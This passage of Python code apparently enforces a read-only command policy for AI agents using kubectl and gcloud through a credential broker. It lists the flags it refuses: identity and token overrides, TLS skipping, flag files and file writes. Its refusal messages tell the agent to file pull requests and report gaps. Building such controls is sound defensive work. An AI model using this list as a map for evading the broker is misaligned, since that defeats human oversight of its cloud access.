        # Ordered before the identity check, the same way gcloud checks
        # --flags-file before _GCLOUD_IDENTITY_FLAGS: the refusal a caller sees
        # should name the file-of-flags problem rather than the identity one it
        # happens to be a vehicle for.
        kuberc_flag = _kubectl_has_kuberc(argv)
        if kuberc_flag:
            return Decision(
                allowed=False,
                rule_id="kubernetes.kuberc-forbidden",
                message=(
                    "--kuberc reads options from a file under the agent's control, "
                    "including impersonation defaults that never appear in the "
                    "command line. We cannot read that file without a race "
                    "condition, so we refuse it outright."
                ),
                offending_flag=kuberc_flag,
            )

        identity_flag = _kubectl_refuses_identity_change(argv)
        if identity_flag:
            return Decision(
                allowed=False,
                rule_id="kubernetes.identity-change-forbidden",
                message=(
                    "Identity and API server address belong to the broker. Remove "
                    "--server, --token, --user, --client-certificate, "
                    "--insecure-skip-tls-verify and the other credential flags to "
                    "use the cluster and identity the proxy configured."
                ),
                offending_flag=identity_flag,
            )

        file_write_flag = _kubectl_refuses_file_write(argv)
        if file_write_flag:
            return Decision(
                allowed=False,
                rule_id="kubernetes.file-write-forbidden",
                message=(
                    "--profile, --profile-output and --cache-dir write to a path of "
                    "the caller's choosing inside the credential sidecar. Remove them."
                ),
                offending_flag=file_write_flag,
            )

        verb, unknown_flag = _kubectl_verb_and_flag(argv)
        if verb is None:
            return Decision(
                allowed=False,
                rule_id="kubernetes.unreadable-command",
                message="Could not identify a kubectl verb, so the command was refused.",
                offending_flag=unknown_flag,
            )
        if verb in KUBECTL_REFUSED_SUBCOMMANDS:
            return Decision(
                allowed=False,
                rule_id="kubernetes.read-only",
                message=(
                    "Agents hold read-only access to Kubernetes. Propose this change "
                    "as a pull request instead."
                ),
                verb_tuple=verb,
            )
        if verb in KUBECTL_READ_VERBS or verb[:1] in KUBECTL_READ_VERBS:
            return _ALLOWED
        return Decision(
            allowed=False,
            rule_id="kubernetes.read-only",
            message=(
                "Agents hold read-only access to Kubernetes. Propose this change "
                "as a pull request instead."
            ),
            verb_tuple=verb,
        )

    if argv[0] == "gcloud":
        flags_file = _gcloud_has_flags_file(argv)
        if flags_file:
            return Decision(
                allowed=False,
                rule_id="gcp.flags-file-forbidden",
                message=(
                    "--flags-file reads from a file under the agent's control. "
                    "We cannot read that file without a race condition, so we refuse "
                    "it outright. Expand flags manually instead of using a file."
                ),
                offending_flag=flags_file,
            )

        identity_flag = _gcloud_refuses_identity_change(argv)
        if identity_flag:
            return Decision(
                allowed=False,
                rule_id="gcp.identity-change-forbidden",
                message=(
                    "Identity belongs to the broker. Remove --access-token-file, "
                    "--configuration, and --account to use the default identity."
                ),
                offending_flag=identity_flag,
            )

        write_flag = _gcloud_writes_a_file(argv)
        if write_flag:
            return Decision(
                allowed=False,
                rule_id="gcp.file-write-forbidden",
                message=(
                    "This flag writes a file inside the credential proxy's own "
                    "container, not the agent workspace. Drop it and redirect "
                    "the command's stdout instead."
                ),
                offending_flag=write_flag,
            )

        words, unknown_flag = _gcloud_words_and_flag(argv)
        if words is None:
            return Decision(
                allowed=False,
                rule_id="gcp.unreadable-command",
                message=(
                    "gcloud used a flag whose arity is unknown to this module, so the "
                    "command path cannot be read. Report a new gcloud global flag to "
                    "your infrastructure team."
                ),
                offending_flag=unknown_flag,
            )

        if not _gcloud_is_read_only(words):
            return Decision(
                allowed=False,
                rule_id="gcp.read-only",
                message=(
                    "Agents hold read-only access to Google Cloud. Propose this "
                    "change as a pull request instead. If this is a read the "
                    "product runs on its own, it is missing from "
                    "GCLOUD_READ_COMMANDS in command_policy.py -- report it "
                    "rather than working around it."
                ),
                verb_tuple=tuple(words[:3]),  # Cap at 3 words to exclude positionals
            )
        return _ALLOWED

    return _ALLOWED
